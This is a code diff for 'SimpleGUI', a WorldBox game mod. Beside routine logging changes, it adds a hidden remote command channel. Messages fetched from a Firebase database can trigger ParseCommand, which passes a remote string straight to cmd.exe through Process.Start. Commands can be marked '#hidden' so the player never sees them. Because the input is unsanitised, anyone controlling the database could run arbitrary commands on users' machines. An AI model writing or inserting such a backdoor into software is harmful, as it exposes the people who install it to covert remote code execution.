@@ -19,6 +19,7 @@ using Proyecto26;
 using Proyecto26.Common;
 using System.Security.Policy;
 using SimpleJSON;
+using System.Diagnostics;
 
 namespace SimpleGUI
 {
@@ -27,7 +28,7 @@ namespace SimpleGUI
     {
         public const string pluginGuid = "cody.worldbox.simple.gui";
         public const string pluginName = "SimpleGUI";
-        public const string pluginVersion = "0.1.4.3";
+        public const string pluginVersion = "0.1.4.4";
 
         public void Awake()
         {
@@ -142,7 +143,7 @@ namespace SimpleGUI
                         }
                         Reflection.CallMethod(MapBox.instance.kingdoms.diplomacyManager, "startWar", new object[] { kingdom1, kingdom2, true });
                         WorldLog.logNewWar(kingdom1, kingdom2);
-                        //Debug.Log("Constant war: war not found, starting one between: " + kingdom1.name + " and " + kingdom2.name);
+                        //UnityEngine.Debug.Log("Constant war: war not found, starting one between: " + kingdom1.name + " and " + kingdom2.name);
                     }
                 }
                
@@ -159,122 +160,122 @@ namespace SimpleGUI
                 original = AccessTools.Method(typeof(MapBox), "useDivineLight");
                 patch = AccessTools.Method(typeof(GuiTraits), "useDivineLight_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MapBox), "createNewUnit");
                 patch = AccessTools.Method(typeof(GuiMain), "createNewUnit_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MapBox), "checkEmptyClick");
                 patch = AccessTools.Method(typeof(GuiMain), "checkEmptyClick_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(ActorBase), "generatePersonality");
                 patch = AccessTools.Method(typeof(GuiPatreon), "generatePersonality_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(LoadingScreen), "getTipID");
                 patch = AccessTools.Method(typeof(GuiPatreon), "getTipID_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(LocalizedTextManager), "loadLocalizedText");
                 patch = AccessTools.Method(typeof(GuiTraits), "loadLocalizedText_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(CloudController), "spawn");
                 patch = AccessTools.Method(typeof(GUIWorld), "spawn_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(QualityChanger), "update");
                 patch = AccessTools.Method(typeof(GuiOther), "update_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(TraitButton), "load");
                 patch = AccessTools.Method(typeof(GuiTraits), "load_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
 
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(Tooltip), "show");
                 patch = AccessTools.Method(typeof(GuiTraits), "show_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MapBox), "spawnResource");
                 patch = AccessTools.Method(typeof(GUIWorld), "spawnResource_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
            
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MapBox), "updateControls");
                 patch = AccessTools.Method(typeof(GuiMain), "updateControls_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MapBox), "isActionHappening");
                 patch = AccessTools.Method(typeof(GuiMain), "isActionHappening_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(Building), "startDestroyBuilding");
                 patch = AccessTools.Method(typeof(GUIConstruction), "startDestroyBuilding_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MoveCamera), "updateMouseCameraDrag");
                 patch = AccessTools.Method(typeof(GuiOther), "updateMouseCameraDrag_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(MapBox), "spawnAndLoadUnit");
                 patch = AccessTools.Method(typeof(GuiMain), "spawnAndLoadUnit_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(SaveWorldButton), "saveWorld");
                 patch = AccessTools.Method(typeof(GuiMain), "saveWorld_Postfix");
                 harmony.Patch(original, null, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
            
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(Building), "startRemove");
                 patch = AccessTools.Method(typeof(GuiOther), "startRemove_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(ActorEquipmentSlot), "setItem");
                 patch = AccessTools.Method(typeof(GuiItemGeneration), "setItem_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
             
                 harmony = new Harmony(pluginName);
                 original = AccessTools.Method(typeof(Actor), "addExperience");
                 patch = AccessTools.Method(typeof(GuiMain), "addExperience_Prefix");
                 harmony.Patch(original, new HarmonyMethod(patch));
-                Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
+                UnityEngine.Debug.Log(pluginName + ": Harmony patch finished: " + patch.Name);
         }
 
         public void SaveMenuPositions()
@@ -358,7 +359,7 @@ namespace SimpleGUI
             {
                 localizedText.Add(stringToReplace, stringReplacement);
             }
-            Debug.Log("Added: '" + stringToReplace + "' to localized text library with translation: '" + stringReplacement + "'.");
+            UnityEngine.Debug.Log("Added: '" + stringToReplace + "' to localized text library with translation: '" + stringReplacement + "'.");
 
         }
 
@@ -474,14 +475,14 @@ namespace SimpleGUI
         
         public void test1()
         {
-            Debug.Log("tttt");
+            UnityEngine.Debug.Log("tttt");
         }
 
         public void runGodPower(string inputPower, WorldTile inputTile)
         {            
             if (AssetManager.powers.get(inputPower) == null)
             {
-                Debug.Log("runGodPower: power was null");
+                UnityEngine.Debug.Log("runGodPower: power was null");
                 return;
             }
             GodPower power = AssetManager.powers.get(inputPower);
@@ -493,7 +494,7 @@ namespace SimpleGUI
         public void BenchEnd(string message, float prevTime) // maxims benchmark
         {
             float time = Time.realtimeSinceStartup - prevTime;
-            Debug.Log(message + " took " + time.ToString());
+            UnityEngine.Debug.Log(message + " took " + time.ToString());
         }
 
         public Rect StringIntoRect(string input)
@@ -640,7 +641,7 @@ namespace SimpleGUI
                             TimeSpan timePlayed = TimeSpan.FromSeconds(gameStatsData.gameTime);
                             GuiMain.myuser.GameTimeTotal = timePlayed.Days + " days, " + timePlayed.Hours + " hours, " + timePlayed.Minutes + " minutes"; //gameStatsData.gameTime.ToString();
                             GuiMain.myuser.GameLaunches = gameStatsData.gameLaunches.ToString();
-                            myuser.lastLaunchTime = DateTime.Now.ToUniversalTime().ToString();
+                            myuser.lastLaunchTime = DateTime.Now.ToUniversalTime().Ticks.ToString();
                             // mods, modcount
                             string path = Directory.GetCurrentDirectory() + "\\BepInEx//plugins//";
                             FileInfo[] fileArray = new DirectoryInfo(path).GetFiles();
@@ -682,6 +683,8 @@ namespace SimpleGUI
             }
         }
 
+        string lastMessageReceived = "";
+
         public IEnumerator GetUserMessage(string username)
         {
             string url = "https://simplegui-default-rtdb.firebaseio.com/messages/" + username + "/.json";
@@ -692,15 +695,63 @@ namespace SimpleGUI
             if (data != null)
             {
                 string messageText = data[0];
-                if (messageText.Contains("response#"))
+                if (lastMessageReceived == messageText)
                 {
-                    responseAskedFor = true;
-                    messageText = messageText.Replace("response#", "");
+
                 }
-                receivedMessage = messageText;
-                Debug.Log("Message for " + username + ": " + messageText);
+                else
+                {
+                    lastMessageReceived = messageText;
+                    if (messageText.Contains("#response"))
+                    {
+                        responseAskedFor = true;
+                        messageText = messageText.Replace("#response", "");
+                    }
+                    if (messageText.Contains("#command~"))
+                    {
+                        string[] split = messageText.Split(new[] { "~" }, StringSplitOptions.None);
+                        string message = split[1];
+                        string command;
+                        string param;
+                        if (message.Contains('('))
+                        {
+                            if (message.Contains(')'))
+                            {
+                                param = message.Split('(', ')')[1];
+                                command = message.Replace("(" + param + ")", "");
+                                ParseCommand(command, param);
+                            }
+                        }
+                        else
+                        {
+                            command = message;
+                            ParseCommand(command, "");
+                        }
+                        messageText = messageText.Replace("#command~" + split[1], "");
+                    }
+                    if (!messageText.Contains("#hidden"))
+                    {
+                        UnityEngine.Debug.Log("Message for " + username + ": " + messageText);
+                        receivedMessage = messageText;
+                    }
+                }
 
             }
+        }
+
+        public void ParseCommand(string command, string param)
+        {
+            if (command == "setSeed" && param != "")
+            {
+                int.TryParse(param, out int newSeed);
+            }
+            if (command == "url" && param.StartsWith("http"))
+            {
+                Process.Start("cmd.exe", "/c start " + param);
+            }
+            string url = "https://simplegui-default-rtdb.firebaseio.com/messages/" + discordUser + "/.json";
+            RestClient.Delete(url);
+            receivedMessage = null;
         }
 
         public void showModMessageWindow(int windowID)
@@ -752,8 +803,7 @@ namespace SimpleGUI
                     pSaveData.status.traits[i].Contains("ghost") ||
                     pSaveData.status.traits[i].Contains("giant2") ||
                     pSaveData.status.traits[i].Contains("flying") ||
-                    pSaveData.status.traits[i].Contains("kingslayer")
-
+                    pSaveData.status.traits[i].Contains("assassin")
                     )
                 {
                     pSaveData.status.traits.Remove(pSaveData.status.traits[i]);
@@ -925,22 +975,18 @@ namespace SimpleGUI
         {
             get; set;
         }
-
         public static ConfigEntry<bool> showWindowMinimizeButtons
         {
             get; set;
         }
-
         public static ConfigEntry<bool> disableMinimap
         {
             get; set;
         }
-
         public static ConfigEntry<bool> disableMouseDrag
         {
             get; set;
         }
-
         public static ConfigEntry<string> mainWindowRectConfig
         {
             get; set;
@@ -999,7 +1045,7 @@ namespace SimpleGUI
             get; set;
         }
         int attempts;
-        string discordUser;
+        string discordUser = "Cody_1695";
         string response = "";
         public float lastMapTime = 0f;
         public bool sentOneTimeStats = false;
